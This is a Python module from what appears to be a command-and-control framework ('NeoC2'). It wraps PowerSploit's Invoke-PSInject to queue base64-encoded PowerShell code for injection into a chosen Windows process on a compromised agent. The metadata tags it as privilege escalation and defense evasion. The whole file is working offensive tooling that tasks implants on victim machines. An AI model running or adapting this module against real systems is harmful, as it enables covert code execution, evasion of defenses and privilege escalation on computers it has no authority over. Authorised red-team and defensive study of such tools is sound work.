# modules/Invoke-PSInject.py
import os
import importlib.util
import base64
import re

def get_info():
    """Get module information"""
    return {
        "name": "Invoke-PSInject",
        "description": "Execute a PowerShell script block injection into a specified process",
        "type": "privilege_escalation",
        "platform": "windows",
        "author": "PowerSploit / NeoC2 Framework",
        "references": ["https://github.com/PowerShellMafia/PowerSploit"],
        "technique_id": "T1055.001,T1059.001",  # Process Injection: Dynamic-link Library Injection, Command and Scripting Interpreter: PowerShell
        "mitre_tactics": ["Defense Evasion", "Privilege Escalation"],
        "options": {
            "agent_id": {
                "description": "ID of the agent to run the PowerShell injection on",
                "required": True
            },
            "process_id": {
                "description": "Process ID of the process to inject the PowerShell code into",
                "required": True
            },
            "powershell_code": {
                "description": "PowerShell code to inject into the target process",
                "required": True
            },
        }
    }


def execute(options, session):
    """Execute the Invoke-PSInject module with given options and session"""
    agent_id = options.get("agent_id")
    process_id = options.get("process_id")
    powershell_code = options.get("powershell_code")
    
    if not agent_id:
        return {
            "success": False,
            "error": "agent_id is required"
        }
    
    if not process_id:
        return {
            "success": False,
            "error": "process_id is required"
        }
    
    if not powershell_code:
        return {
            "success": False,
            "error": "powershell_code is required"
        }
    
    # Validate process_id as integer
    try:
        process_id = int(process_id)
    except ValueError:
        return {
            "success": False,
            "error": f"Invalid process_id: {process_id}. Must be a number."
        }
    
    # Validate powershell_code for potential command injection
    # Only basic validation to ensure it's not empty
    if len(powershell_code.strip()) == 0:
        return {
            "success": False,
            "error": "powershell_code cannot be empty"
        }
    
    # Set the current agent in the session
    session.current_agent = agent_id
    
    # Read the original Invoke-PSInject.ps1 script
    script_path = os.path.join(os.path.dirname(__file__), 'external', 'Invoke-PSInject.ps1')
    try:
        with open(script_path, 'r', encoding='utf-8') as f:
            original_script = f.read()
    except FileNotFoundError:
        return {
            "success": False,
            "error": f"Could not find Invoke-PSInject script at {script_path}"
        }
    except Exception as e:
        return {
            "success": False,
            "error": f"Error reading Invoke-PSInject script: {str(e)}"
        }
    
    # Encode the PowerShell code to base64 to pass as a parameter
    encoded_powershell_code = base64.b64encode(powershell_code.encode('utf-16le')).decode('ascii')
    
    # Build the execution command with parameters
    execution_command = f'{original_script}\nInvoke-PSInject -ProcId {process_id} -PoshCode "{encoded_powershell_code}"'
    
    # Return the execution command - the agent will handle PowerShell execution and base64 encoding
    powershell_command = execution_command
    
    # Check if session has a valid agent_manager
    if not hasattr(session, 'agent_manager') or session.agent_manager is None:
        return {
            "success": False,
            "error": "Session does not have an initialized agent_manager"
        }
    
    # Queue the task on the agent
    try:
        agent_manager = session.agent_manager
        task_id = agent_manager.add_task(agent_id, powershell_command)
        if task_id:
            return {
                "success": True,
                "output": f"Invoke-PSInject task {task_id} queued for agent {agent_id}",
                "task_id": task_id,
                "process_id": process_id
            }
        else:
            return {
                "success": False,
                "error": f"Failed to queue task for agent {agent_id}"
            }
    except Exception as e:
        return {
            "success": False,
            "error": f"Error queuing task: {str(e)}"
        }